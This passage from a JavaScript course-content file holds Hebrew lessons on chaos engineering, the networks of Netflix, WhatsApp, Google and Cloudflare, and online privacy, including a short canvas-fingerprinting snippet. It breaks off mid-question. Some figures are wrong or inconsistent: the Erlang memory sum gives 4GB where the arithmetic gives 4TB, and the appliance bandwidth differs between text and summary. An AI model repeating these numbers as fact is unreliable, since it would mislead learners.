          <p>Chaos Engineering = <strong>הזרקת כשלים מבוקרת למערכת חיה</strong> כדי לגלות חולשות לפני שהמציאות מגלה אותן.</p>
          <ul>
            <li><strong>Chaos Monkey:</strong> מפיל instances אקראיים ב-AWS</li>
            <li><strong>Latency Monkey:</strong> מוסיף עיכובים אקראיים לבקשות</li>
            <li><strong>Chaos Gorilla:</strong> מפיל Availability Zone שלמה</li>
            <li><strong>Chaos Kong:</strong> מדמה נפילת Region שלם של AWS</li>
          </ul>
          <div class="diagram-container">
            <svg viewBox="0 0 360 100" class="content-diagram">
              <rect x="10" y="20" width="75" height="60" rx="6" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="47" y="48" text-anchor="middle" font-size="9">Service A</text>
              <text x="47" y="60" text-anchor="middle" font-size="8" fill="var(--text-muted)">healthy</text>
              <rect x="140" y="20" width="75" height="60" rx="6" fill="#fee2e2" stroke="#f87171"/>
              <text x="177" y="48" text-anchor="middle" font-size="9" fill="#dc2626">Service B</text>
              <text x="177" y="60" text-anchor="middle" font-size="8" fill="#dc2626">💀 killed</text>
              <rect x="270" y="20" width="75" height="60" rx="6" fill="#d1fae5" stroke="#34d399"/>
              <text x="307" y="44" text-anchor="middle" font-size="9" fill="#065f46">Service A</text>
              <text x="307" y="56" text-anchor="middle" font-size="8" fill="#065f46">fallback ✓</text>
              <text x="307" y="68" text-anchor="middle" font-size="8" fill="#065f46">cache used</text>
              <path d="M 87 50 L 138 50" stroke="var(--accent)" stroke-width="2" marker-end="url(#arrow)"/>
              <path d="M 217 50 L 268 50" stroke="#34d399" stroke-width="2" marker-end="url(#arrow)"/>
              <text x="180" y="95" text-anchor="middle" font-size="8" fill="var(--text-muted)">Chaos → כשל → fallback עובד = מערכת resilient</text>
            </svg>
          </div>
          <p><strong>עיקרון:</strong> resilience לא נבנית בתכנון — היא נבדקת בפועל. Netflix מריצה Chaos Monkey בproduction מדי יום. הם יותר מוכנים לכשלים אמיתיים כי הם רגילים אליהם.</p>
          <p><strong>GameDay:</strong> פרקטיקה של Amazon — ביום קבוע בוחרים תרחיש ("Region נפל") ומתרגלים תגובה. כמו תרגיל אש, אבל לresilient systems.</p>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – הלקחים הגדולים",
        intro: "<p>מה מלמדות הקריסות הגדולות על עיצוב מערכות?</p>",
        blocks: [
          {
            title: "בלי single point of failure",
            icon: "🔗",
            content: `<p>כל מערכת שיש בה רכיב אחד שנפילתו מפילה הכל — היא מיקום כשל. פייסבוק שהסתמכה על BGP אחיד ללא fallback, Amazon שהריצה הכל ב-us-east-1 — <strong>redundancy היא לא תכונה, היא הישרדות</strong>. בניית מערכת כנגד הכשל של כל רכיב בה = chaos-by-design.</p>`
          },
          {
            title: "הכשל היה בתהליך, לא בקוד",
            icon: "📋",
            content: `<p>ברוב הקריסות הגדולות — הקוד לא היה שגוי. ה-patch היה קיים. ה-backup היה שם. מה שנכשל: <strong>תהליך</strong> — deploy ללא peer review, config change ללא rollback plan, on-call שלא קיבל פאג'. ההשקעה ב-incident response, runbooks, ואוטומציה של deployments שווה יותר מ-1000 שורות קוד.</p>`
          }
        ]
      },
      {
        type: "summary",
        title: "סיכום פרק 23",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>BGP = פרוטוקול "מפת האינטרנט". ביטול prefix → נעלמת מהרשת. אין authentication מובנה</li>
              <li>SQL Slammer (2003): 376 בתים, 10 דקות, 75K שרתים נגועים. Patch היה קיים. לא עודכנו</li>
              <li>BGP Leaks: כל AS יכול להכריז על כל prefix. RPKI = פתרון קריפטוגרפי חלקי</li>
              <li>Postmortem: blameless, timeline, 5 Why's, action items. לא עונשים — לומדים</li>
              <li>Chaos Engineering: מזריקים כשלים בכוונה לגלות חולשות. Netflix Chaos Monkey בproduction יומיומי</li>
              <li>לקח עמוק: single point of failure = בעיה. redundancy + runbooks + testing = survival</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 23",
        questions: [
          {
            q: "למה כשפייסבוק ביטלה את ה-BGP announcements שלה, עובדיה לא יכלו להתחבר מרחוק לתקן?",
            a: "כלי הניהול והגישה מרחוק של פייסבוק (SSH, VPN, כלי ניטור) כולם מתחברים לשרתי פייסבוק. כשפייסבוק הסירה את עצמה מהאינטרנט — גם הגישה הפנימית מרחוק נפלה. המהנדסים נאלצו לנסוע פיזית."
          },
          {
            q: "מה ההבדל בין BGP Leak ל-BGP Hijacking?",
            a: "BGP Leak = טעות לא מכוונת — AS מפיץ routing שהיה צריך להישאר פנימי. BGP Hijacking = פעולה זדונית — AS מכריז על prefix שאינו שלו כדי לנתב תנועה דרכו."
          },
          {
            q: "מה עיקרון ה-'blameless postmortem' ולמה הוא חשוב?",
            a: "לא מחפשים מי אשם אלא מה גרם לכשל. כשאנשים לא מפחדים מעונש — הם מדווחים בפתיחות, הפוסטמורטם מדויק יותר, הלמידה עמוקה יותר. תרבות של אשמה מביאה להסתרת מידע."
          }
        ]
      }
    ]
  },
  {
    id: 24,
    title: "מאחורי הקלעים – הרשתות של הענקיות",
    pages: [
      {
        type: "explanation",
        title: "Netflix Open Connect – CDN בתוך ה-ISP",
        content: `
          <p>Netflix אחראית על ~15% מתנועת האינטרנט בעולם בשעות הערב. איך הם עושים את זה בלי לשלם מיליארדים על bandwidth?</p>
          <p><strong>Open Connect Appliance (OCA):</strong> Netflix בנתה שרתי קאש מיוחדים ו<strong>מציעה אותם בחינם לISPs</strong>. הISP מקבל hardware בחינם, Netflix חוסכת bandwidth. Win-win.</p>
          <div class="diagram-container">
            <svg viewBox="0 0 360 120" class="content-diagram">
              <rect x="10" y="40" width="80" height="40" rx="4" fill="#fee2e2" stroke="#f87171"/>
              <text x="50" y="57" text-anchor="middle" font-size="9">Netflix Origin</text>
              <text x="50" y="69" text-anchor="middle" font-size="8" fill="var(--text-muted)">AWS + נתוני וידאו</text>
              <rect x="140" y="20" width="80" height="35" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="180" y="37" text-anchor="middle" font-size="9">OCA בISP</text>
              <text x="180" y="49" text-anchor="middle" font-size="8" fill="var(--text-muted)">Stranger Things 4K</text>
              <rect x="140" y="65" width="80" height="35" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="180" y="82" text-anchor="middle" font-size="9">OCA בISP אחר</text>
              <text x="180" y="94" text-anchor="middle" font-size="8" fill="var(--text-muted)">The Crown 4K</text>
              <rect x="280" y="40" width="70" height="40" rx="4" fill="#d1fae5" stroke="#34d399"/>
              <text x="315" y="57" text-anchor="middle" font-size="9" fill="#065f46">משתמשים</text>
              <text x="315" y="69" text-anchor="middle" font-size="8" fill="#065f46">≤5ms RTT</text>
              <line x1="90" y1="60" x2="138" y2="37" stroke="var(--text-muted)" stroke-width="1.5" stroke-dasharray="4,2"/>
              <line x1="90" y1="60" x2="138" y2="82" stroke="var(--text-muted)" stroke-width="1.5" stroke-dasharray="4,2"/>
              <line x1="220" y1="37" x2="278" y2="57" stroke="#34d399" stroke-width="2"/>
              <line x1="220" y1="82" x2="278" y2="62" stroke="#34d399" stroke-width="2"/>
              <text x="180" y="115" text-anchor="middle" font-size="8" fill="var(--text-muted)">הvideo מגיע מה-ISP עצמו, לא מAWS</text>
            </svg>
          </div>
          <p><strong>מה ה-OCA שומר?</strong> Netflix יודעת מה פופולרי באזור כל ISP. בלילה, היא מעבירה pre-emptively לOCA את הסדרות הפופולריות. למחרת — הכל ב-cache מקומי.</p>
          <p><strong>טכנולוגית:</strong> כל OCA = FreeBSD + nginx מותאם + כוננים NVMe. גודל: 100-250TB storage. מריצים ~300Gbps bandwidth לכל appliance.</p>
        `
      },
      {
        type: "explanation",
        title: "WhatsApp – מיליארד משתמשים עם 50 מהנדסים",
        content: `
          <p><strong>2014:</strong> WhatsApp נמכרת לפייסבוק ב-$19 מיליארד. 450 מיליון משתמשים פעילים. <strong>55 עובדים בסך הכל.</strong></p>
          <p>איך? ארכיטקטורה שמינימליזציה היא עיקרה:</p>
          <ul>
            <li><strong>Erlang/OTP:</strong> שפת תכנות שנבנתה לtelecom, לניהול מיליוני חיבורים קונקורנטיים. כל חיבור = process קל משקל (לא thread OS)</li>
            <li><strong>Single responsibility:</strong> WhatsApp לא עשתה stories, games, payments. <strong>רק הודעות</strong>. פחות פיצ'רים = פחות bugs = צוות קטן</li>
            <li><strong>XMPP מותאם:</strong> פרוטוקול XML-based לhidden messaging שWhatsApp שינתה להיות binary — קטן פי 10</li>
          </ul>
          <div class="code-preview">
            <pre><code># ארכיטקטורת WhatsApp בצורה פשוטה:
Client → (TCP long-lived connection) → WhatsApp Server
Server: Erlang process per connection (~2MB RAM each)
2M connections × 2MB = 4GB RAM (!) בלבד
vs. Python/Java thread: 8-512MB per thread

1,000,000 concurrent users:
  Erlang: ~2GB RAM, 1 server
  Java threads: ~500GB RAM, 100 servers</code></pre>
          </div>
          <p><strong>Protocol פשוט = scale גדול:</strong> כל הודעה = מזהה ייחודי + timestamp + recipient + payload. שרת לא שומר הודעות — רק מנתב. ברגע שהתקבלה — נמחקת. זה גם פרטיות, זה גם scale.</p>
          <p>לקח: <strong>בחירת טכנולוגיה נכונה לבעיה הנכונה</strong> שווה יותר ממאה מהנדסים נוספים.</p>
        `
      },
      {
        type: "explanation",
        title: "Google B4 – הרשת הפרטית של גוגל",
        content: `
          <p>גוגל לא סומכת על האינטרנט הציבורי לתנועה הפנימית שלה. ב-2013 פרסמה גוגל על <strong>B4</strong> — רשת WAN פרטית שמחברת את כל מרכזי הנתונים שלה.</p>
          <p><strong>הסיבה:</strong> האינטרנט הציבורי = BGP. BGP מאוד sub-optimal — בוחר מסלול קצר, לא מסלול עם הכי פחות עומס. לגוגל שמעבירה ~PB ביום בין DCs — זה לא מספיק.</p>
          <p><strong>B4 = Software-Defined WAN:</strong></p>
          <ul>
            <li>כל ה-hardware (switches, routers) מנוהל ע"י software מרכזי — <strong>OpenFlow controller</strong></li>
            <li>ניתוב מבוסס תזמון ואופטימיזציה — Traffic Engineering בזמן אמת</li>
            <li>bandwidth utilization: ~100% (vs. 30-40% ברשתות רגילות)</li>
            <li>גוגל בנתה את ה-hardware שלה — Pluto switches — במקום Cisco/Juniper</li>
          </ul>
          <div class="diagram-container">
            <svg viewBox="0 0 360 110" class="content-diagram">
              <rect x="20" y="20" width="65" height="35" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="52" y="41" text-anchor="middle" font-size="9">DC אמריקה</text>
              <rect x="145" y="10" width="65" height="35" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="177" y="31" text-anchor="middle" font-size="9">DC אירופה</text>
              <rect x="270" y="20" width="65" height="35" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="302" y="41" text-anchor="middle" font-size="9">DC אסיה</text>
              <rect x="145" y="70" width="65" height="30" rx="4" fill="#3b82f6" stroke="#1d4ed8"/>
              <text x="177" y="86" text-anchor="middle" font-size="9" fill="white">SDN Controller</text>
              <line x1="85" y1="37" x2="143" y2="27" stroke="#0891b2" stroke-width="2"/>
              <line x1="210" y1="27" x2="268" y2="37" stroke="#0891b2" stroke-width="2"/>
              <line x1="177" y1="55" x2="177" y2="68" stroke="#3b82f6" stroke-width="2" stroke-dasharray="4,2"/>
              <line x1="52" y1="55" x2="177" y2="70" stroke="#3b82f6" stroke-width="1.5" stroke-dasharray="4,2"/>
              <line x1="302" y1="55" x2="177" y2="70" stroke="#3b82f6" stroke-width="1.5" stroke-dasharray="4,2"/>
              <text x="177" y="108" text-anchor="middle" font-size="8" fill="var(--text-muted)">controller מחליט ניתוב בזמן אמת לפי עומסים</text>
            </svg>
          </div>
          <p><strong>מה גוגל הרוויחה:</strong> חסכה ~$1B+ בשנה על bandwidth חיצוני. ביצועי latency עדיפים. שליטה מוחלטת על מסלולי הנתונים שלה.</p>
        `
      },
      {
        type: "explanation",
        title: "כבלי הים – עמוד השדרה הנסתר של האינטרנט",
        content: `
          <p>~99% מהתנועה הבינלאומית עובר דרך <strong>כבלי תת-ים</strong>. לא לוויינים. כבלים. 400+ כבלים, 1.2 מיליון ק"מ, בקרקעית האוקיינוס.</p>
          <p><strong>מה בתוך הכבל?</strong></p>
          <ul>
            <li>Fiber optic — בדרך כלל 8-16 זוגות סיבים</li>
            <li>כל סיב = מספר ערוצי אור (wavelengths) — DWDM</li>
            <li>כבל מודרני: 400+ Tbps (!)</li>
            <li>עומד 25 שנה בלחץ אוקיאני, טמפרטורה קרה, מלח</li>
          </ul>
          <p><strong>מי מחזיק את הכבלים?</strong> עד לפני 10 שנים — קונסורציומי של טלקומים. היום — גוגל, פייסבוק, Amazon בנו כבלים <strong>פרטיים</strong>:</p>
          <ul>
            <li><strong>Dunant</strong> (Google) — US-France, 250Tbps</li>
            <li><strong>2Africa</strong> (Meta) — מקיף את אפריקה, 180Tbps</li>
            <li><strong>MAREA</strong> (Microsoft+Facebook) — US-Spain, 160Tbps</li>
          </ul>
          <p><strong>סכנות:</strong> עוגנים של ספינות גורמים ל-70% מהנזקים. ב-2008 — עוגן אחד בים התיכון חתך 3 כבלים → 75M אנשים באפריקה ואסיה ללא אינטרנט. יש ספינות תיקון ייעודיות שמחכות 24/7.</p>
        `
      },
      {
        type: "explanation",
        title: "Cloudflare – 300 ערים, אותה כתובת IP",
        content: `
          <p>Cloudflare מגינה על ~20% מאתרי האינטרנט. 300 נקודות נוכחות. ~1 מיליארד כתובות IP שמנהלת. עיקרון ההנדסה שלהם: <strong>Anycast</strong>.</p>
          <p><strong>Anycast:</strong> <em>אותה</em> כתובת IP מוכרזת ממאות מקומות. BGP מנתב כל משתמש לנקודה הקרובה ביותר אוטומטית.</p>
          <div class="diagram-container">
            <svg viewBox="0 0 360 110" class="content-diagram">
              <circle cx="180" cy="55" r="20" fill="none" stroke="var(--accent)" stroke-width="1.5" stroke-dasharray="4,2"/>
              <text x="180" y="52" text-anchor="middle" font-size="8" fill="var(--accent)">1.1.1.1</text>
              <text x="180" y="63" text-anchor="middle" font-size="7" fill="var(--text-muted)">Anycast</text>
              <circle cx="50" cy="20" r="12" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="50" y="24" text-anchor="middle" font-size="7">NY PoP</text>
              <circle cx="310" cy="20" r="12" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="310" y="24" text-anchor="middle" font-size="7">TLV PoP</text>
              <circle cx="50" cy="90" r="12" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="50" y="94" text-anchor="middle" font-size="7">LON PoP</text>
              <circle cx="310" cy="90" r="12" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="310" y="94" text-anchor="middle" font-size="7">TKY PoP</text>
              <line x1="62" y1="26" x2="160" y2="46" stroke="var(--accent)" stroke-width="1.5"/>
              <line x1="298" y1="26" x2="200" y2="46" stroke="var(--accent)" stroke-width="1.5"/>
              <line x1="62" y1="84" x2="160" y2="64" stroke="var(--accent)" stroke-width="1.5"/>
              <line x1="298" y1="84" x2="200" y2="64" stroke="var(--accent)" stroke-width="1.5"/>
              <text x="180" y="105" text-anchor="middle" font-size="8" fill="var(--text-muted)">BGP מנתב כל משתמש לPoP הקרוב — אוטומטי</text>
            </svg>
          </div>
          <p><strong>DDoS mitigation:</strong> Cloudflare ספגה ב-2024 מתקפת DDoS של <strong>5.6 Tbps</strong> — הגדולה שתועדה. איך? ה-traffic מחולק ל-300 PoPs. כל PoP ספג רק שבריר. לאחר filtering מקומי — תנועה נקייה עוברת ל-origin.</p>
          <p><strong>Workers:</strong> Cloudflare אפשרה לרוץ JavaScript/WASM ב-300 מקומות בו-זמנית. Edge computing — הקוד רץ ליד המשתמש, לא בdata center רחוק.</p>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – הרשת כמוצר",
        intro: "<p>כמה תובנות על הכוח, הכלכלה, והגיאופוליטיקה של רשתות:</p>",
        blocks: [
          {
            title: "מי שולט בכבלים — שולט בתוכן",
            icon: "🌊",
            content: `<p>כשHuawei הציעה לבנות כבלי ים לאפריקה במחיר הזול מהשוק — ממשלות מערביות חסמו. הסיבה: <strong>מי שבנה את הכבל, יכול לנטר את התנועה עליו</strong>. NSA כבר עשתה זאת על כבלים אמריקניים — מפרטות של Snowden. הרשת הפיזית היא פוליטיקה.</p>`
          },
          {
            title: "ספקיות הענן ממציאות את הרשת מחדש",
            icon: "☁️",
            content: `<p>Google, AWS, Azure בנו רשתות שמגיעות לביצועים שטלקומים בנו דעצורים לעשות. BGP ב-2024 הוא עדיין פרוטוקול שנוצר ב-1989 "על מפיות בדינר". QUIC, HTTP/3, SD-WAN, eBPF — הטכנולוגיות שמחליפות את הרשת ישנה נוצרות בחברות הטכנולוגיה, לא בIETF בלבד.</p>`
          }
        ]
      },
      {
        type: "summary",
        title: "סיכום פרק 24",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>Netflix Open Connect: OCA ב-ISPs — פריה ה-cache מתרחשת לפני הצפייה. ~100Gbps per appliance</li>
              <li>WhatsApp: Erlang = מיליון חיבורים קונקורנטיים ב-2GB RAM. פחות פיצ'רים = scale גדול</li>
              <li>Google B4: SD-WAN פרטי, OpenFlow controller, 100% bandwidth utilization, hardware מותאם</li>
              <li>כבלי ים: 99% מהתנועה הבינלאומית. Google/Meta/Microsoft בנו כבלים פרטיים</li>
              <li>Cloudflare Anycast: אותה IP ב-300 PoPs. BGP = ניתוב אוטומטי לקרוב ביותר. 5.6 Tbps DDoS ספוג</li>
              <li>רשת = כוח גיאופוליטי. מי בונה = מי מנטר</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 24",
        questions: [
          {
            q: "מה ה-Open Connect Appliance של Netflix ואיזה יתרון הוא נותן לISP?",
            a: "OCA = שרת cache שNetflix מספקת לISPs בחינם. ה-ISP מקבל hardware ללא עלות, ותנועת הvideo לא יוצאת מהרשת שלו (חוסך bandwidth יקר). Netflix חוסכת עלויות transit עצומות. Win-win."
          },
          {
            q: "למה WhatsApp בחרה ב-Erlang ולא ב-Python או Java?",
            a: "Erlang/OTP נבנתה לtelecom — ניהול מיליוני חיבורים קונקורנטיים. כל חיבור הוא process קל (ולא thread OS כבד). ב-Erlang: מיליון חיבורים ≈ 2GB RAM. ב-Java threads: עשרות GB. הבחירה הארכיטקטונית אפשרה צוות קטן לנהל scale ענק."
          },
          {
            q: "מה Anycast ואיך Cloudflare משתמשת בו להגנה מDDoS?",
            a: "Anycast = אותה כתובת IP מוכרזת ממאות מקומות. BGP מנתב כל משתמש לנקודה הקרובה. בDDoS: התנועה מחולקת ל-300 PoPs — כל PoP ספג שבריר. לאחר filtering מקומי, רק תנועה נקייה עוברת לorigin. Scale ו-distribution = resilience."
          }
        ]
      }
    ]
  },
  {
    id: 25,
    title: "פרטיות ומעקב – מה באמת רואים עלייך",
    pages: [
      {
        type: "explanation",
        title: "מה ה-ISP שלך רואה",
        content: `
          <p>ספקית האינטרנט שלך רואה <strong>כל</strong> DNS query שלך — גם אחרי שעברת ל-HTTPS. מדוע?</p>
          <ul>
            <li>HTTPS מצפין <em>תוכן</em> — לא את שם הדומיין</li>
            <li>DNS query: "מה ה-IP של pornhub.com?" — נשלח בflat text לשרת DNS (בדרך כלל של ה-ISP) ללא הצפנה</li>
            <li>TLS SNI (Server Name Indication): בחיבור HTTPS — שם הדומיין נשלח בclear text כחלק מה-TLS Handshake הראשוני</li>
          </ul>
          <div class="code-preview">
            <pre><code># מה ISP רואה כשאת גולשת ל-gmail.com:
DNS Query:  "מה ה-IP של gmail.com?" [גלוי]
TLS SNI:    "מתחברת ל: gmail.com" [גלוי]
IP address: 142.250.80.101 [גלוי]
תוכן:       ENCRYPTED [מוצפן]

# Timeline עם timestamps:
08:23:41  DNS query → gmail.com
08:23:41  TLS → gmail.com:443
08:24:05  DNS query → youtube.com
09:17:33  DNS query → bankofamerica.com</code></pre>
          </div>
          <p><strong>מה ה-ISP יכול לעשות עם זה:</strong> בארה"ב (post-2017) — ISPs מחויבים לשמור ויכולים למכור את נתוני הגלישה. ברשימת הלקוחות הפוטנציאליים: חברות ביטוח, מעסיקים, סוכנויות פרסום.</p>
          <p><strong>הגנות:</strong> DoH (DNS over HTTPS) + ECH (Encrypted Client Hello, גרסת TLS 1.3 שמסתירה גם SNI) + VPN. אף אחד לבד לא מספיק.</p>
        `
      },
      {
        type: "explanation",
        title: "Browser Fingerprinting – זיהוי ללא Cookies",
        content: `
          <p>חשבת שIncognito מגן עלייך? Browser Fingerprinting לא צריך cookies. הוא מזהה אותך לפי <strong>מה שהדפדפן שלך הוא</strong>.</p>
          <p><strong>מה נאסף לפינגרפרינט:</strong></p>
          <ul>
            <li><strong>User-Agent:</strong> Chrome 124 / Windows 11 / Intel</li>
            <li><strong>Fonts מותקנים:</strong> האם יש Arial, Times New Roman, Calibri + 200 נוספות?</li>
            <li><strong>Canvas fingerprint:</strong> הדפדפן מצייר טקסט — pixel rendering שונה בכל GPU/OS</li>
            <li><strong>WebGL renderer:</strong> NVIDIA GeForce RTX 3070 (!)  </li>
            <li><strong>Screen resolution + color depth + timezone</strong></li>
            <li><strong>Audio context:</strong> כיצד הדפדפן מעבד audio — ייחודי לhardware</li>
          </ul>
          <div class="code-preview">
            <pre><code">// Canvas fingerprinting — איך זה עובד:
const canvas = document.createElement('canvas')
const ctx = canvas.getContext('2d')
ctx.font = '18px Arial'
ctx.fillText('Hello, World! 🌍', 10, 50)
// כל GPU/OS מצייר פיקסלים שונים מעט
const fingerprint = canvas.toDataURL()
// → hash ייחודי ≈ 99% ייחודיות</code></pre>
          </div>
          <p><strong>הנתון המבהיל:</strong> EFF's Panopticlick מצא שצירוף הפרמטרים הוא ייחודי ל-~1 מ-286,777 דפדפנים. אתה כמעט בלתי ניתן לזיהוי-שגוי.</p>
          <p><strong>הגנה:</strong> Tor Browser randomizes fingerprint. Firefox Resist Fingerprinting mode. אחרת — קשה מאוד.</p>
        `
      },
      {
        type: "explanation",
        title: "כיצד Google ו-Meta עוקבות עלייך",
        content: `
          <p>כשאת גולשת לאתר שכולל <code>Facebook Like Button</code> או <code>Google Analytics</code> — Google ו-Meta יודעות שביקרת שם, גם אם לא לחצת על כלום.</p>
          <p><strong>Third-party tracking pixel:</strong></p>
          <ol>
            <li>אתר X מכיל <code>&lt;img src="https://facebook.com/pixel?id=123"&gt;</code></li>
            <li>הדפדפן שלך שולח request ל-facebook.com</li>
            <li>Facebook מקבלת: כתובת IP שלך, Referer (= אתר X), timestamp, cookies של Facebook שלך</li>
            <li>Facebook יודעת: היית באתר X בשעה Z</li>
          </ol>
          <div class="diagram-container">
            <svg viewBox="0 0 360 100" class="content-diagram">
              <rect x="10" y="20" width="70" height="55" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="45" y="42" text-anchor="middle" font-size="9">הדפדפן שלך</text>
              <text x="45" y="57" text-anchor="middle" font-size="8" fill="var(--text-muted)">cookie: fb_uid=X</text>
              <rect x="140" y="30" width="75" height="35" rx="4" fill="#f0f9ff" stroke="#0ea5e9"/>
              <text x="177" y="47" text-anchor="middle" font-size="9">אתר חדשות</text>
              <text x="177" y="59" text-anchor="middle" font-size="8" fill="var(--text-muted)">ynet.co.il</text>
              <rect x="280" y="20" width="70" height="55" rx="4" fill="#eff6ff" stroke="#3b82f6"/>
              <text x="315" y="42" text-anchor="middle" font-size="9" fill="#1d4ed8">Meta Pixel</text>
              <text x="315" y="57" text-anchor="middle" font-size="8" fill="#1d4ed8">יודעת: X קרא</text>
              <text x="315" y="69" text-anchor="middle" font-size="8" fill="#1d4ed8">חדשות ב-14:30</text>
              <path d="M 80 47 L 138 47" stroke="var(--accent)" stroke-width="2" marker-end="url(#a)"/>
              <path d="M 215 47 L 278 47" stroke="#3b82f6" stroke-width="2" stroke-dasharray="4,2"/>
              <text x="246" y="43" font-size="8" fill="#3b82f6">pixel req</text>
            </svg>
          </div>
          <p><strong>Graph of tracking:</strong> Meta Pixel נמצא ב-30%+ מאתרי האינטרנט. Google Analytics ב-50%+. גם בלי account — הם בונות פרופיל "phantom" לפי fingerprint + IP.</p>
          <p><strong>הגנה:</strong> uBlock Origin מחסום trackers, Firefox Enhanced Tracking Protection, Privacy Badger. בלי extension — כמעט בלתי אפשרי להגן.</p>
        `
      },
      {
        type: "explanation",
        title: "TOR – בצל של אנונימיות",
        content: `
          <p><strong>Tor</strong> (The Onion Router) — פותח על ידי Navy Research Lab האמריקאי ב-1995. היום: ~2 מיליון משתמשים יומיים, מנוהל על ידי Tor Project (nonprofit).</p>
          <p><strong>איך עובד Onion Routing:</strong></p>
          <ol>
            <li>הדפדפן בוחר 3 nodes: Guard (Entry) → Middle → Exit</li>
            <li>מצפין את הנתונים בשלוש שכבות — כמו בצל</li>
            <li>Guard node מסיר שכבה ראשונה: יודע מאיפה הגעת, לא לאן</li>
            <li>Middle node מסיר שכבה שנייה: לא יודע מי שלח, לא לאן</li>
            <li>Exit node מסיר שכבה שלישית: יודע לאן, לא מי</li>
          </ol>
          <div class="diagram-container">
            <svg viewBox="0 0 380 90" class="content-diagram">
              <rect x="5" y="28" width="55" height="35" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="32" y="48" text-anchor="middle" font-size="9">את</text>
              <rect x="80" y="18" width="55" height="55" rx="4" fill="#fef3c7" stroke="#f59e0b"/>
              <text x="107" y="42" text-anchor="middle" font-size="8">Guard</text>
              <text x="107" y="54" text-anchor="middle" font-size="7" fill="#92400e">יודע: מי</text>
              <text x="107" y="64" text-anchor="middle" font-size="7" fill="#92400e">לא יודע: לאן</text>
              <rect x="160" y="18" width="55" height="55" rx="4" fill="#f0fdf4" stroke="#34d399"/>
              <text x="187" y="42" text-anchor="middle" font-size="8">Middle</text>
              <text x="187" y="54" text-anchor="middle" font-size="7" fill="#065f46">לא יודע</text>
              <text x="187" y="64" text-anchor="middle" font-size="7" fill="#065f46">כלום</text>
              <rect x="240" y="18" width="55" height="55" rx="4" fill="#fef2f2" stroke="#f87171"/>
              <text x="267" y="42" text-anchor="middle" font-size="8">Exit</text>
              <text x="267" y="54" text-anchor="middle" font-size="7" fill="#dc2626">יודע: לאן</text>
              <text x="267" y="64" text-anchor="middle" font-size="7" fill="#dc2626">לא יודע: מי</text>
              <rect x="320" y="28" width="55" height="35" rx="4" fill="var(--accent-soft)" stroke="var(--accent)"/>
              <text x="347" y="48" text-anchor="middle" font-size="9">אתר</text>
              <path d="M 60 45 L 78 45" stroke="var(--accent)" stroke-width="2"/>
              <path d="M 135 45 L 158 45" stroke="var(--accent)" stroke-width="2"/>
              <path d="M 215 45 L 238 45" stroke="var(--accent)" stroke-width="2"/>
              <path d="M 295 45 L 318 45" stroke="var(--accent)" stroke-width="2"/>
              <text x="190" y="85" text-anchor="middle" font-size="8" fill="var(--text-muted)">שום node אחד לא יודע הכל — זה Onion Routing</text>
            </svg>
          </div>
          <p><strong>מגבלות Tor:</strong></p>
          <ul>
            <li>איטי (3 hops + encryption = latency גבוה)</li>
            <li>Exit node יכול לקרוא תנועת HTTP (לא HTTPS)</li>
            <li>אנונימיות פגיעה אם יש timing correlation — תוקף שרואה גם כניסה וגם יציאה</li>
            <li>JavaScript יכול לחשוף IP — Tor Browser מגביל JS</li>
          </ul>
        `
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – האמת על פרטיות",
        intro: "<p>כמה עובדות שמפתיעות רוב האנשים:</p>",
        blocks: [
          {
            title: "Incognito Mode לא עושה מה שאת חושבת",
            icon: "🕵️",
            content: `<p>Incognito מוחק את ה<em>local</em> history — הדפדפן שלך. אבל: ה-ISP עדיין רואה הכל, גוגל רואה (אם logged in), ה-network admin של ה-WiFi רואה, וכל tracker שברשת רואה. Incognito = "לא ישמר על המחשב הזה". זה הכל. Google שילמה $5B בסכסוך קולקטיבי על טעיית הגדרה זו.</p>`
          },
          {
            title: "Metadata גרוע יותר מ-Content",
            icon: "📊",
            content: `<p>"We kill people based on metadata" — Michael Hayden, ראש NSA לשעבר. Metadata = מי דיבר עם מי, מתי, ממה מיקום. לא תוכן השיחה. מ-metadata בלבד ניתן להסיק: יחסים, בריאות (שיחות לרופא), פוליטיקה, דת. HTTPS מסתיר content — לא metadata.</p>`
          }
        ]
      },
      {
        type: "summary",
        title: "סיכום פרק 25",
        content: `
          <div class="chapter-summary">
            <h3>נקודות מפתח:</h3>
            <ul>
              <li>ISP רואה: כל DNS query, TLS SNI (שם הדומיין), IP addresses. לא את תוכן HTTPS</li>
              <li>Browser Fingerprint: canvas, fonts, WebGL, screen = זיהוי ייחודי כמעט ללא cookies</li>
              <li>Third-party tracking: Meta Pixel ב-30%+ אתרים. רואה אותך גם ללא לחיצה</li>
              <li>Tor = Onion Routing: 3 nodes, שכבות הצפנה. שום node לא יודע הכל. איטי</li>
              <li>Incognito = local only. ISP, Google, ISP Admin — עדיין רואים</li>
              <li>Metadata גרוע מcontent. "מי דיבר עם מי" = תמונה מלאה ללא תוכן</li>
            </ul>
          </div>
        `
      },
      {
        type: "questions",
        title: "שאלות הבנה - פרק 25",
        questions: [
          {
            q: "גלשת ל-bank.com ב-HTTPS. מה ה-ISP יכול לראות?",
            a: "ה-ISP רואה: DNS query לbank.com (מי ה-IP), ה-TLS SNI בחיבור (שם 'bank.com'), כתובת IP של שרת הבנק, גודל ותזמון החבילות. לא יכול לראות: שם משתמש, סיסמה, תוכן הדפים — כל זה מוצפן ב-HTTPS."
          },
          {
            q: "מה Canvas Fingerprinting ולמה קשה להגן ממנו?",
